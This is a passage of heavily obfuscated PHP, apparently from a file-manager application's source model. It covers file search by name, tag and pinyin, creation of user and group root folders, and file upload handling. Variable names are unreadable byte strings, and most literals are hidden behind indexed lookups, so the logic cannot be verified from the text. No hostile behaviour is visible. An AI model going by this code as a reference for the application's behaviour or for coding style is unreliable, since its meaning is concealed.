$this->_listDataApply($ğÊÄó¥[$Ææ ïˆÇ[369]]); $this->_listMake($ğÊÄó¥); return $ğÊÄó¥; } private function _listSearchFileContent(&$µÄíõÒ, $¸¾¦®üè, $­ê°¿†Ú, $ä©èøÍë) { $ôŒÜ‘Ã =& $_SERVER[å¸¿•¶£]; if (!$¸¾¦®üè[$ôŒÜ‘Ã[1957]] || $µÄíõÒ[$ôŒÜ‘Ã[366]][$ôŒÜ‘Ã[353]] > 1) { return; } if (!isset($ä©èøÍë[$ôŒÜ‘Ã[32]]) || !is_array($¸¾¦®üè[$ôŒÜ‘Ã[468]])) { return; } $ä©èøÍë[$ôŒÜ‘Ã[468]] = array($ôŒÜ‘Ã[7], $¸¾¦®üè[$ôŒÜ‘Ã[468]]); unset($ä©èøÍë[$ôŒÜ‘Ã[32]]); unset($¸¾¦®üè[$ôŒÜ‘Ã[468]]); $´Ç•ëãĞ = $this->field($­ê°¿†Ú)->where($ä©èøÍë)->limit($ôŒÜ‘Ã[2121])->select(); if (!$´Ç•ëãĞ || count($´Ç•ëãĞ) == 0) { return; } $µÄíõÒ[$ôŒÜ‘Ã[369]] = array_merge($´Ç•ëãĞ, $µÄíõÒ[$ôŒÜ‘Ã[369]]); $µÄíõÒ[$ôŒÜ‘Ã[366]][$ôŒÜ‘Ã[367]] += count($´Ç•ëãĞ); } private function _listSearchTag(&$Ò™ş›ğ³, $œÒ»…¡ó, $½Á¿½é) { $ÃÈ…§Ó =& $_SERVER[å¸¿•¶£]; if (!$œÒ»…¡ó[$ÃÈ…§Ó[1957]] || $Ò™ş›ğ³[$ÃÈ…§Ó[366]][$ÃÈ…§Ó[353]] > 1) { return; } $ƒ—È‹ô = Model($ÃÈ…§Ó[2122])->listData(); $²Òöü‰ = array(); $ŞÄÓÑ’¶ = $œÒ»…¡ó[$ÃÈ…§Ó[1957]]; foreach ($ƒ—È‹ô as $…”æÔü) { $†ªğã÷Ú = $…”æÔü[$ÃÈ…§Ó[32]]; $–Œß³Æ÷ = str_replace($ÃÈ…§Ó[53], $ÃÈ…§Ó[12], Pinyin::get($†ªğã÷Ú)); if (stripos($†ªğã÷Ú, $ŞÄÓÑ’¶) !== !1 || stripos($–Œß³Æ÷, $ŞÄÓÑ’¶) !== !1) { $²Òöü‰[] = $…”æÔü[$ÃÈ…§Ó[399]]; } } if (!$²Òöü‰) { return; } $Êü·„£ = array($ÃÈ…§Ó[426] => array($ÃÈ…§Ó[7], $²Òöü‰), $ÃÈ…§Ó[1674] => USER_ID); $Ú¸û“ = Model($ÃÈ…§Ó[428])->field($ÃÈ…§Ó[84])->where($Êü·„£)->select(); $Ú¸û“ = array_to_keyvalue($Ú¸û“, $ÃÈ…§Ó[12], $ÃÈ…§Ó[84]); $–šŒó‹ = array_unique($Ú¸û“); $this->_listSearchMerge($Ò™ş›ğ³, $œÒ»…¡ó, $½Á¿½é, $–šŒó‹); } private function _listSearchDesc(&$‰®¡ÀØß, $ú¦ó•¼Ï, $øÌ³Ã) { $“Šß›… =& $_SERVER[å¸¿•¶£]; if (!$ú¦ó•¼Ï[$“Šß›…[1957]] || $‰®¡ÀØß[$“Šß›…[366]][$“Šß›…[353]] > 1) { return; } $ÜÖƒİ§ = array($“Šß›…[94] => $“Šß›…[453], $“Šß›…[374] => array($“Šß›…[383], $“Šß›…[1959] . $ú¦ó•¼Ï[$“Šß›…[1957]] . $“Šß›…[1959])); $óË‹ÆïÄ = !1; if ($óË‹ÆïÄ) { $¶ãÀ»˜ = $this->listSearchChildren($ú¦ó•¼Ï[$“Šß›…[432]]); $¶ãÀ»˜ = array_unique($¶ãÀ»˜); if (!$¶ãÀ»˜) { return; } $ÜÖƒİ§[$“Šß›…[402]] = array($“Šß›…[7], $¶ãÀ»˜); } $ô¦ğıÖÎ = Model($“Šß›…[560])->field($“Šß›…[402])->where($ÜÖƒİ§)->limit(5000)->select(); $âÖãºÆ = array_to_keyvalue($ô¦ğıÖÎ, $“Šß›…[12], $“Šß›…[402]); $this->_listSearchMerge($‰®¡ÀØß, $ú¦ó•¼Ï, $øÌ³Ã, $âÖãºÆ); } private function _listSearchGroupTag(&$³²á±¡, $¯‚ĞÓÍ, $‘úÏË‹ï) { $¿ÏµÁã‰ =& $_SERVER[å¸¿•¶£]; if (!$¯‚ĞÓÍ[$¿ÏµÁã‰[1957]] || $³²á±¡[$¿ÏµÁã‰[366]][$¿ÏµÁã‰[353]] > 1 || !$¯‚ĞÓÍ[$¿ÏµÁã‰[432]]) { return; } $‘¯íø÷« = $this->sourceInfo($¯‚ĞÓÍ[$¿ÏµÁã‰[432]]); if (!$‘¯íø÷« || $‘¯íø÷«[$¿ÏµÁã‰[411]] != SourceModel::TYPE_GROUP) { return; } $íÓøÑ¾Ü = $‘¯íø÷«[$¿ÏµÁã‰[496]]; $©ôÌ×Şò = Model($¿ÏµÁã‰[2123])->get($íÓøÑ¾Ü); $Ï¯µ®¿ = array(); $ê¡„™¢¨ = $¯‚ĞÓÍ[$¿ÏµÁã‰[1957]]; foreach ($©ôÌ×Şò[$¿ÏµÁã‰[369]] as $¯ÂÜî†) { $ùâÃş‹ò = $¯ÂÜî†[$¿ÏµÁã‰[32]]; $‰“Ç¼Ş = str_replace($¿ÏµÁã‰[53], $¿ÏµÁã‰[12], Pinyin::get($ùâÃş‹ò)); if (stripos($ùâÃş‹ò, $ê¡„™¢¨) !== !1 || stripos($‰“Ç¼Ş, $ê¡„™¢¨) !== !1) { $Ï¯µ®¿[] = $¯ÂÜî†[$¿ÏµÁã‰[399]]; } } if (!$Ï¯µ®¿) { return; } $ÀºÜœÎ¹ = array($¿ÏµÁã‰[426] => array($¿ÏµÁã‰[7], $Ï¯µ®¿), $¿ÏµÁã‰[1674] => 0, $¿ÏµÁã‰[33] => $¿ÏµÁã‰[1979] . $íÓøÑ¾Ü); $®õîçòÆ = Model($¿ÏµÁã‰[428])->field($¿ÏµÁã‰[84])->where($ÀºÜœÎ¹)->select(); $®õîçòÆ = array_to_keyvalue($®õîçòÆ, $¿ÏµÁã‰[12], $¿ÏµÁã‰[84]); $öĞ’©²‘ = array_unique($®õîçòÆ); $this->_listSearchMerge($³²á±¡, $¯‚ĞÓÍ, $‘úÏË‹ï, $öĞ’©²‘); } private function _listSearchMerge(&$ˆ„§ôÉŸ, $³æÕÙ›, $¶ ªş«ƒ, $Ù­ïõœ) { $Ê­Œü’´ =& $_SERVER[å¸¿•¶£]; if (!$Ù­ïõœ) { return; } $„øû¾áª = array_to_keyvalue($ˆ„§ôÉŸ[$Ê­Œü’´[369]], $Ê­Œü’´[12], $Ê­Œü’´[402]); $÷°¯±¢ = array_diff($Ù­ïõœ, $„øû¾áª); if (!$÷°¯±¢) { return; } $Ûâæ¤¢î = array($Ê­Œü’´[402] => array($Ê­Œü’´[7], $÷°¯±¢)); $º¢Ú®°× = $this->field($¶ ªş«ƒ)->where($Ûâæ¤¢î)->select(); if (!$º¢Ú®°×) { return; } $Ï›ÔšÚ = array(); foreach ($º¢Ú®°× as $ĞÄ€ÄèÃ) { if ($this->_listSearchFilter($ĞÄ€ÄèÃ, $³æÕÙ›)) { $Ï›ÔšÚ[] = $ĞÄ€ÄèÃ; } } $ˆ„§ôÉŸ[$Ê­Œü’´[369]] = array_merge($Ï›ÔšÚ, $ˆ„§ôÉŸ[$Ê­Œü’´[369]]); $ˆ„§ôÉŸ[$Ê­Œü’´[366]][$Ê­Œü’´[367]] += count($Ï›ÔšÚ); } private function _listSearchFilter($Õ×µçÓâ, $à“µÒÊ¼) { $Ã´ñÇú‚ =& $_SERVER[å¸¿•¶£]; $£Ğİ¾ß‡ = $Õ×µçÓâ[$Ã´ñÇú‚[410]] == $Ã´ñÇú‚[88]; if (!strstr($Õ×µçÓâ[$Ã´ñÇú‚[511]], $Ã´ñÇú‚[50] . $à“µÒÊ¼[$Ã´ñÇú‚[432]] . $Ã´ñÇú‚[50])) { return !1; } if (isset($à“µÒÊ¼[$Ã´ñÇú‚[412]]) && $à“µÒÊ¼[$Ã´ñÇú‚[412]] != $Ã´ñÇú‚[1918]) { if ($à“µÒÊ¼[$Ã´ñÇú‚[412]] == $Ã´ñÇú‚[75] && !$£Ğİ¾ß‡) { return !1; } if ($à“µÒÊ¼[$Ã´ñÇú‚[412]] != $Ã´ñÇú‚[75] && $£Ğİ¾ß‡) { return !1; } if (!strstr($Õ×µçÓâ[$Ã´ñÇú‚[174]], $Ã´ñÇú‚[50] . $à“µÒÊ¼[$Ã´ñÇú‚[412]] . $Ã´ñÇú‚[50])) { return !1; } } if (isset($à“µÒÊ¼[$Ã´ñÇú‚[2124]]) && $à“µÒÊ¼[$Ã´ñÇú‚[2124]] < $Õ×µçÓâ[$Ã´ñÇú‚[76]]) { return !1; } if (isset($à“µÒÊ¼[$Ã´ñÇú‚[2125]]) && $à“µÒÊ¼[$Ã´ñÇú‚[2125]] > $Õ×µçÓâ[$Ã´ñÇú‚[76]]) { return !1; } if (isset($à“µÒÊ¼[$Ã´ñÇú‚[590]]) && $à“µÒÊ¼[$Ã´ñÇú‚[590]] != $Õ×µçÓâ[$Ã´ñÇú‚[456]]) { return !1; } return !0; } public function listSearchChildren($˜¬Şôì, $¿µ¢Ş¢å = 5000) { $í¡Æ³°’ =& $_SERVER[å¸¿•¶£]; $‚ŸöÉÜ½ = array(); $ÑĞˆäÔï = $this->sourceInfo($˜¬Şôì); $—²ÓËò = array($í¡Æ³°’[511] => array($í¡Æ³°’[383], $ÑĞˆäÔï[$í¡Æ³°’[511]] . $ÑĞˆäÔï[$í¡Æ³°’[402]] . $í¡Æ³°’[541])); $Õüƒï¾ = $this->field($í¡Æ³°’[76])->where($—²ÓËò)->limit($¿µ¢Ş¢å + 1)->select(); $ÚÆò©Ó¯ = is_array($Õüƒï¾) ? count($Õüƒï¾) : 0; if ($ÚÆò©Ó¯ > $¿µ¢Ş¢å) { return $this->_listSearchChildrenNear($˜¬Şôì, $¿µ¢Ş¢å); } $ïåº „² = $this->field($í¡Æ³°’[402])->where($—²ÓËò)->select(); $‚ŸöÉÜ½ = array_to_keyvalue($ïåº „², $í¡Æ³°’[12], $í¡Æ³°’[402]); return $‚ŸöÉÜ½; } private function _listSearchChildrenNear($™˜ãöƒ’, $¹»´ãô÷) { $±±ÖÛù‹ =& $_SERVER[å¸¿•¶£]; $¢®²Ñ×À = array(); $›÷³ëµ = array($±±ÖÛù‹[432] => $™˜ãöƒ’); $Æ…è°¢· = $this->field($±±ÖÛù‹[2126])->where($›÷³ëµ)->select(); $ç±ùö×§ = array_to_keyvalue(array_filter_by_field($Æ…è°¢·, $±±ÖÛù‹[410], $±±ÖÛù‹[88]), $±±ÖÛù‹[12], $±±ÖÛù‹[402]); $¢®²Ñ×À = array_merge($¢®²Ñ×À, array_to_keyvalue($Æ…è°¢·, $±±ÖÛù‹[12], $±±ÖÛù‹[402])); if (!$ç±ùö×§) { return $¢®²Ñ×À; } $›÷³ëµ = array($±±ÖÛù‹[432] => array($±±ÖÛù‹[7], $ç±ùö×§)); $Æ…è°¢· = $this->field($±±ÖÛù‹[2126])->where($›÷³ëµ)->limit($¹»´ãô÷)->select(); $¢®²Ñ×À = array_merge($¢®²Ñ×À, array_to_keyvalue($Æ…è°¢·, $±±ÖÛù‹[12], $±±ÖÛù‹[402])); $¢®²Ñ×À = array_slice($¢®²Ñ×À, 0, $¹»´ãô÷); return $¢®²Ñ×À; } private function _listSearchBindPinyin($£¡…¶úó, &$âºÓ„—ó, &$‹‡½µÑ¥) { $¼¿ÅÅä =& $_SERVER[å¸¿•¶£]; if (!isset($£¡…¶úó[$¼¿ÅÅä[1957]]) || !$£¡…¶úó[$¼¿ÅÅä[1957]]) { return; } if (!Input::check($£¡…¶úó[$¼¿ÅÅä[1957]], $¼¿ÅÅä[318]) || strlen($£¡…¶úó[$¼¿ÅÅä[1957]]) < 2) { return; } $ÕğßÆòº = "\x4c\105\x46\x54\40\x4a\x4f\x49\x4e\40{$this->tablePrefix}\151\157\x5f\163\x6f\165\162\143\x65\x5f\155\x65\x74\141\x20\x6d\145\x74\141\x20\157\156\x20\163\157\x75\x72\x63\x65\56\163\157\165\x72\x63\x65\x49\x44\40\x3d\x20\x6d\x65\164\x61\56\x73\157\165\162\x63\145\x49\x44"; $Ÿ¬‰Ş­’ = array(); $‹‡½µÑ¥ = str_replace(array($¼¿ÅÅä[231], $¼¿ÅÅä[53], $¼¿ÅÅä[2127]), $¼¿ÅÅä[12], $‹‡½µÑ¥); $‹‡½µÑ¥ = $¼¿ÅÅä[438] . str_replace($¼¿ÅÅä[50], $¼¿ÅÅä[439], $‹‡½µÑ¥); $ÏùšÓö‡ = $âºÓ„—ó[$¼¿ÅÅä[32]]; unset($âºÓ„—ó[$¼¿ÅÅä[32]]); foreach ($âºÓ„—ó as $–ÄßìªĞ => $ÎòÇÜŒü) { $Ÿ¬‰Ş­’[$¼¿ÅÅä[438] . $–ÄßìªĞ] = $ÎòÇÜŒü; } foreach ($ÏùšÓö‡ as $ß»‘ò ) { $Ÿ¬‰Ş­’[] = array($¼¿ÅÅä[443] => $ß»‘ò , $¼¿ÅÅä[1007] => $¼¿ÅÅä[1961], array($¼¿ÅÅä[2128] => $ß»‘ò , $¼¿ÅÅä[2129] => array($¼¿ÅÅä[7], array($¼¿ÅÅä[465], $¼¿ÅÅä[464])))); } $this->join($ÕğßÆòº); $âºÓ„—ó = $Ÿ¬‰Ş­’; } private function _parseSearchWhere($Í„Áùë†) { $üâí‘ëÔ =& $_SERVER[å¸¿•¶£]; $êŸ–²ÑÉ = array(); if (isset($Í„Áùë†[$üâí‘ëÔ[767]]) && $Í„Áùë†[$üâí‘ëÔ[767]]) { $êŸ–²ÑÉ[$üâí‘ëÔ[85]] = array($üâí‘ëÔ[2130], $Í„Áùë†[$üâí‘ëÔ[767]]); } if (isset($Í„Áùë†[$üâí‘ëÔ[768]]) && $Í„Áùë†[$üâí‘ëÔ[768]]) { $±·¬éŒ = array($üâí‘ëÔ[2131], $Í„Áùë†[$üâí‘ëÔ[768]]); if ($êŸ–²ÑÉ[$üâí‘ëÔ[85]]) { $êŸ–²ÑÉ[$üâí‘ëÔ[85]] = array($êŸ–²ÑÉ[$üâí‘ëÔ[85]], $±·¬éŒ, $üâí‘ëÔ[2132]); } else { $êŸ–²ÑÉ[$üâí‘ëÔ[85]] = $±·¬éŒ; } } if (isset($Í„Áùë†[$üâí‘ëÔ[2124]]) && $Í„Áùë†[$üâí‘ëÔ[2124]] > 0) { $êŸ–²ÑÉ[$üâí‘ëÔ[76]] = array($üâí‘ëÔ[2130], $Í„Áùë†[$üâí‘ëÔ[2124]]); } if (isset($Í„Áùë†[$üâí‘ëÔ[2125]]) && $Í„Áùë†[$üâí‘ëÔ[2125]]) { $±·¬éŒ = array($üâí‘ëÔ[2131], $Í„Áùë†[$üâí‘ëÔ[2125]]); if ($êŸ–²ÑÉ[$üâí‘ëÔ[76]]) { $êŸ–²ÑÉ[$üâí‘ëÔ[76]] = array($êŸ–²ÑÉ[$üâí‘ëÔ[76]], $±·¬éŒ, $üâí‘ëÔ[2132]); } else { $êŸ–²ÑÉ[$üâí‘ëÔ[76]] = $±·¬éŒ; } } if (isset($Í„Áùë†[$üâí‘ëÔ[590]]) && $Í„Áùë†[$üâí‘ëÔ[590]]) { $êŸ–²ÑÉ[] = array($üâí‘ëÔ[456] => $Í„Áùë†[$üâí‘ëÔ[590]], $üâí‘ëÔ[454] => $Í„Áùë†[$üâí‘ëÔ[590]], $üâí‘ëÔ[1007] => $üâí‘ëÔ[1961]); } if (isset($Í„Áùë†[$üâí‘ëÔ[412]]) && $Í„Áùë†[$üâí‘ëÔ[412]]) { $”„øå  = $Í„Áùë†[$üâí‘ëÔ[412]]; if ($”„øå  == $üâí‘ëÔ[75]) { $êŸ–²ÑÉ[$üâí‘ëÔ[410]] = 1; } else { if ($”„øå  == $üâí‘ëÔ[2133]) { $êŸ–²ÑÉ[$üâí‘ëÔ[410]] = 0; } else { if ($”„øå ) { $”„øå  = is_array($”„øå ) ? $”„øå  : explode($üâí‘ëÔ[50], $”„øå ); $êŸ–²ÑÉ[$üâí‘ëÔ[412]] = array($üâí‘ëÔ[418], $”„øå ); $êŸ–²ÑÉ[$üâí‘ëÔ[410]] = 0; } } } } $this->_parseSearchParent($Í„Áùë†, $êŸ–²ÑÉ); if (isset($Í„Áùë†[$üâí‘ëÔ[1957]]) && trim($Í„Áùë†[$üâí‘ëÔ[1957]])) { $ş¥ñƒ€ = trim($Í„Áùë†[$üâí‘ëÔ[1957]]); $Ã§„¼úı = explode($üâí‘ëÔ[53], $ş¥ñƒ€); if (strlen($ş¥ñƒ€) > 2 && (substr($ş¥ñƒ€, 0, 1) == $üâí‘ëÔ[118] && substr($ş¥ñƒ€, -1) == $üâí‘ëÔ[118]) || substr($ş¥ñƒ€, 0, 1) == $üâí‘ëÔ[58] && substr($ş¥ñƒ€, -1) == $üâí‘ëÔ[58]) { $ş¥ñƒ€ = substr($ş¥ñƒ€, 1, -1); $Ã§„¼úı = array($ş¥ñƒ€); } $êŸ–²ÑÉ[$üâí‘ëÔ[32]] = array(array($üâí‘ëÔ[540], $üâí‘ëÔ[1959] . $ş¥ñƒ€ . $üâí‘ëÔ[1959])); if (count($Ã§„¼úı) > 1) { $êŸ–²ÑÉ[$üâí‘ëÔ[32]] = array(); foreach ($Ã§„¼úı as $…©óÁ®) { if (!trim($…©óÁ®)) { continue; } $êŸ–²ÑÉ[$üâí‘ëÔ[32]][] = array($üâí‘ëÔ[540], $üâí‘ëÔ[1959] . trim($…©óÁ®) . $üâí‘ëÔ[1959]); } } } return $êŸ–²ÑÉ; } private function _parseSearchParent($÷×òò², &$ìçÅ£§ç) { $Î‡ç§‘ =& $_SERVER[å¸¿•¶£]; if (!isset($÷×òò²[$Î‡ç§‘[432]]) || !$÷×òò²[$Î‡ç§‘[432]]) { return; } $˜‚×Ü™ = $this->pathInfo($÷×òò²[$Î‡ç§‘[432]]); $®şÕµ¹ = $˜‚×Ü™[$Î‡ç§‘[432]] . $Î‡ç§‘[12] === $Î‡ç§‘[198]; $ô²†õ— = $˜‚×Ü™[$Î‡ç§‘[411]] == $Î‡ç§‘[505]; if ($˜‚×Ü™[$Î‡ç§‘[522]] == $Î‡ç§‘[523]) { $÷ø¹³˜› = $this->sourceInfo($÷×òò²[$Î‡ç§‘[432]]); $˜‚×Ü™[$Î‡ç§‘[511]] = $÷ø¹³˜›[$Î‡ç§‘[511]]; } $ìçÅ£§ç[$Î‡ç§‘[580]] = array($Î‡ç§‘[540], $˜‚×Ü™[$Î‡ç§‘[511]] . $÷×òò²[$Î‡ç§‘[432]] . $Î‡ç§‘[541]); $øãˆ¦„Ñ = isset($÷×òò²[$Î‡ç§‘[1822]]) && in_array($Î‡ç§‘[505], $÷×òò²[$Î‡ç§‘[1822]]); if (!$øãˆ¦„Ñ || !$ô²†õ— || !$®şÕµ¹ || !$˜‚×Ü™[$Î‡ç§‘[413]]) { return; } if (!AuthModel::authCheckRoot($˜‚×Ü™[$Î‡ç§‘[413]][$Î‡ç§‘[414]])) { return; } $³úÛ²÷ = $˜‚×Ü™[$Î‡ç§‘[496]] . $Î‡ç§‘[12]; if ($³úÛ²÷ == $Î‡ç§‘[88]) { unset($ìçÅ£§ç[$Î‡ç§‘[580]]); $ìçÅ£§ç[$Î‡ç§‘[411]] = self::TYPE_GROUP; return; } $§Ê “Ñ = Model($Î‡ç§‘[512])->groupChildrenAll($³úÛ²÷); $²¬ïÍÎ› = count($§Ê “Ñ); if ($²¬ïÍÎ› <= 1) { return; } $º‚ÍŞÉ = array($Î‡ç§‘[432] => 0, $Î‡ç§‘[411] => self::TYPE_GROUP, $Î‡ç§‘[496] => array($Î‡ç§‘[7], $§Ê “Ñ)); $îàÜû”  = $this->field($Î‡ç§‘[2134])->where($º‚ÍŞÉ)->limit($²¬ïÍÎ›)->select(); $ìçÅ£§ç[$Î‡ç§‘[580]] = array(); foreach ($îàÜû”  as $Ü¸€¾ÑÂ) { $ìçÅ£§ç[$Î‡ç§‘[580]][] = array($Î‡ç§‘[540], $Î‡ç§‘[521] . $Ü¸€¾ÑÂ[$Î‡ç§‘[402]] . $Î‡ç§‘[541]); } $ìçÅ£§ç[$Î‡ç§‘[580]][] = $Î‡ç§‘[1961]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($×‡öŠ±ş) { $éô¬˜…Û =& $_SERVER[å¸¿•¶£]; $·ÖùÎ·ä = Model($éô¬˜…Û[504])->where(array($éô¬˜…Û[1665] => $×‡öŠ±ş))->find(); $©Ä”Û†¶ = $this->_mkdirRoot(SourceModel::TYPE_USER, $×‡öŠ±ş, $·ÖùÎ·ä[$éô¬˜…Û[32]]); $this->userDesktopAdd($©Ä”Û†¶); return $©Ä”Û†¶; } public function userDesktopAdd($ÑÕˆÑÈ) { $®éŠ¸Å =& $_SERVER[å¸¿•¶£]; $âú‡§¡ = LNG($®éŠ¸Å[2135]); $ËÈôÅ‚ = $this->mkdir($ÑÕˆÑÈ, $âú‡§¡); $this->metaSet($ËÈôÅ‚, $®éŠ¸Å[2136], $®éŠ¸Å[88]); $this->metaSet($ÑÕˆÑÈ, $®éŠ¸Å[2137], $ËÈôÅ‚); } public function userPathSafeAdd($«€èø ·) { $Ş–«Ş“û =& $_SERVER[å¸¿•¶£]; $Ñ±¯ã  = Model($Ş–«Ş“û[504])->getInfoFull($«€èø ·); if (!$Ñ±¯ã ) { return !1; } if (_get($Ñ±¯ã , $Ş–«Ş“û[526])) { return $Ñ±¯ã [$Ş–«Ş“û[466]][$Ş–«Ş“û[2138]]; } $ÅË»åØ· = $this->_mkdirRoot(SourceModel::TYPE_USER, $«€èø ·, $Ş–«Ş“û[2139], $Ş–«Ş“û[433]); Model($Ş–«Ş“û[504])->metaSet($«€èø ·, $Ş–«Ş“û[2138], $ÅË»åØ·); $this->metaSet($ÅË»åØ·, $Ş–«Ş“û[2140], $«€èø ·); return $ÅË»åØ·; } public function groupRootAdd($ôİšêÍ×) { $¬øãÊÑú =& $_SERVER[å¸¿•¶£]; $¶ø½Ÿí² = Model($¬øãÊÑú[512])->where(array($¬øãÊÑú[1951] => $ôİšêÍ×))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ôİšêÍ×, $¶ø½Ÿí²[$¬øãÊÑú[32]]); } public function systemRootPathAdd($÷‹Òøò) { if ($÷‹Òøò != $_SERVER[å¸¿•¶£][534]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $÷‹Òøò); } public function userRootRemove($ÚÒâ¾õÙ) { $äıÎ¨¸Æ = $this->targetSourceRoot(SourceModel::TYPE_USER, $ÚÒâ¾õÙ, !0); foreach ($äıÎ¨¸Æ as $›äê®ñ‹) { if (!$›äê®ñ‹) { continue; } $this->remove($›äê®ñ‹[$_SERVER[å¸¿•¶£][402]], !1); } } public function groupRootRemove($·˜—şË) { $Ùé¥ĞÜĞ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $·˜—şË); if (!$Ùé¥ĞÜĞ) { return; } $this->remove($Ùé¥ĞÜĞ[$_SERVER[å¸¿•¶£][402]], !1); } private function _mkdirRoot($ôŸ‰Ö³», $÷¹½¸ú´, $œ²„ú“, $ì¦Ö„ã¬ = '') { $Øó¡Ù»¼ =& $_SERVER[å¸¿•¶£]; $âšÅÕ¯ = array($Øó¡Ù»¼[401] => 0, $Øó¡Ù»¼[576] => $ôŸ‰Ö³», $Øó¡Ù»¼[577] => $÷¹½¸ú´, $Øó¡Ù»¼[574] => 1, $Øó¡Ù»¼[578] => USER_ID, $Øó¡Ù»¼[579] => USER_ID, $Øó¡Ù»¼[575] => $ì¦Ö„ã¬, $Øó¡Ù»¼[580] => $Øó¡Ù»¼[521], $Øó¡Ù»¼[430] => 0, $Øó¡Ù»¼[545] => 0, $Øó¡Ù»¼[469] => 0, $Øó¡Ù»¼[581] => $Øó¡Ù»¼[12]); if ($¥Ôîœ‰î = $this->where($âšÅÕ¯)->find()) { return $¥Ôîœ‰î[$Øó¡Ù»¼[402]]; } $¯Œ¿àöó = "\115\157\144\145\x6c\123\157\x75\162\x63\x65\x2e\155\x6b\144\151\162\x52\x6f\157\x74\x2e{$ôŸ‰Ö³»}\x2e{$÷¹½¸ú´}\x2e" . $œ²„ú“; CacheLock::lock($¯Œ¿àöó); $âšÅÕ¯[$Øó¡Ù»¼[32]] = $œ²„ú“; $ûì÷¬á = $this->add($âšÅÕ¯); $»–éîÛ = array($Øó¡Ù»¼[582] => short_id($ûì÷¬á)); $this->where(array($Øó¡Ù»¼[417] => $ûì÷¬á))->save($»–éîÛ); CacheLock::unlock($¯Œ¿àöó); return $ûì÷¬á; } private function targetSourceRoot($¨Œ”ë‹¤, $‰ı¬›Ö×, $ª—•ÀŒŞ = false) { $úÉŠªÏ§ =& $_SERVER[å¸¿•¶£]; $µçÙş­ = array($úÉŠªÏ§[401] => 0, $úÉŠªÏ§[576] => $¨Œ”ë‹¤, $úÉŠªÏ§[577] => $‰ı¬›Ö×); if ($ª—•ÀŒŞ) { $Ù«¿º©á = $this->where($µçÙş­)->select(); return $Ù«¿º©á ? $Ù«¿º©á : array(); } $¬´…ì® = $this->where($µçÙş­)->find(); return $¬´…ì® ? $¬´…ì® : array(); } public function sourceRootGroup($–Á“èşâ) { $È¤—¦ø¾ =& $_SERVER[å¸¿•¶£]; if (is_string($–Á“èşâ)) { $–Á“èşâ = array($–Á“èşâ); } $›ÄØ¯ğ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $–Á“èşâ, $È¤—¦ø¾[189]); $ß÷œøŞ¹ = array($È¤—¦ø¾[369] => $›ÄØ¯ğ, $È¤—¦ø¾[366] => array($È¤—¦ø¾[765] => count($–Á“èşâ))); $this->_listDataApply($ß÷œøŞ¹[$È¤—¦ø¾[369]]); $this->_listMake($ß÷œøŞ¹); return array_to_keyvalue($ß÷œøŞ¹[$È¤—¦ø¾[82]], $È¤—¦ø¾[496]); } public function mkfile($Œ¶®ÇÄ÷, $À–¬€ä, $Üš»Ø¹¯ = '', $ÄÁåõ¾Ê = REPEAT_RENAME) { $Ä¤ÃãäÏ =& $_SERVER[å¸¿•¶£]; $’îÇ´¥… = Model($Ä¤ÃãäÏ[601])->addFileByContent($Üš»Ø¹¯, $À–¬€ä); return $this->_createFileCall($Œ¶®ÇÄ÷, $À–¬€ä, $’îÇ´¥…, $ÄÁåõ¾Ê, $Ä¤ÃãäÏ[1357]); } public function addFile($à¥ˆÛ‘”, $ôâÇİÕ, $ı†±¹á , $™ ëöå  = false, $«ÂšºÃà = REPEAT_RENAME) { $Ï¡Ï˜÷µ = Model($_SERVER[å¸¿•¶£][601])->addFile($ôâÇİÕ, $ı†±¹á , $™ ëöå ); return $this->_createFileCall($à¥ˆÛ‘”, $ı†±¹á , $Ï¡Ï˜÷µ, $«ÂšºÃà); } public function addFileByFileID($â­­»˜ê, $Ò¿Ì– Ö, $ŸêöĞ, $óØÎ—¥â = REPEAT_RENAME) { $£”Ö‡Ÿó =& $_SERVER[å¸¿•¶£]; $ÒÒÚ›»Ÿ = Model($£”Ö‡Ÿó[601])->find($Ò¿Ì– Ö); Model($£”Ö‡Ÿó[601])->linkAdd($Ò¿Ì– Ö); return $this->_createFileCall($â­­»˜ê, $ŸêöĞ, $ÒÒÚ›»Ÿ, $óØÎ—¥â); } public function addFileByRemote($¢²ó°ï°, $ŸÊš»á†, $ÛéºğŞ™, $À´šİ‡š = array(), $”Å¤Ğ¡ê = REPEAT_RENAME) { $ËÙÜšÂ = Model($_SERVER[å¸¿•¶£][601])->addFileByRemote($ŸÊš»á†, $ÛéºğŞ™, $À´šİ‡š); return $this->_createFileCall($¢²ó°ï°, $ÛéºğŞ™, $ËÙÜšÂ, $”Å¤Ğ¡ê); } private function _createFileCall($‹û€ÈÁÚ, $œæöŸàÕ, $Î¶†ÆÌ, $¹èËÃ¯ä, $éèÑíñ˜ = "\165\x70\154\157\141\144") { $Ïê±’… =& $_SERVER[å¸¿•¶£]; $çÇ­Õ¡ = !1; $this->setMasterDB(); $this->lockWriteStart($‹û€ÈÁÚ, $œæöŸàÕ); $Ó·€Šæ = $this->fileNameExist($‹û€ÈÁÚ, $œæöŸàÕ); $¥ÅõŠÏ = $this->_createFile($‹û€ÈÁÚ, $œæöŸàÕ, $Î¶†ÆÌ, $¹èËÃ¯ä, $çÇ­Õ¡); if (!$çÇ­Õ¡) { Model($Ïê±’…[471])->remove($Î¶†ÆÌ[$Ïê±’…[468]]); } if ($çÇ­Õ¡ && $¥ÅõŠÏ && $¥ÅõŠÏ != $Ó·€Šæ) { Model($Ïê±’…[2108])->eventCreate($¥ÅõŠÏ, $éèÑíñ˜); } $this->lockWriteEnd($‹û€ÈÁÚ, $œæöŸàÕ); return $¥ÅõŠÏ; } public function mkdir($À†ø©×Â, $ç á¡Æ§, $ÙÂŞ¾ä÷ = REPEAT_SKIP) { $üÛâ¹®Ø =& $_SERVER[å¸¿•¶£]; $this->setMasterDB(); $®Ö·…ª = $this->sourceInfo($À†ø©×Â); if (!$®Ö·…ª) { return !1; } $this->lockWriteStart($À†ø©×Â, $ç á¡Æ§); if ($ÙÂŞ¾ä÷ !== !1) { $û’á†õ¸ = $this->fileNameExist($À†ø©×Â, $ç á¡Æ§); if ($û’á†õ¸ && $ÙÂŞ¾ä÷ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($À†ø©×Â, $ç á¡Æ§); return $û’á†õ¸; } $ç á¡Æ§ = $this->fileNameAuto($À†ø©×Â, $ç á¡Æ§, $ÙÂŞ¾ä÷); } $»µ¸¯Û = array($üÛâ¹®Ø[574] => 1, 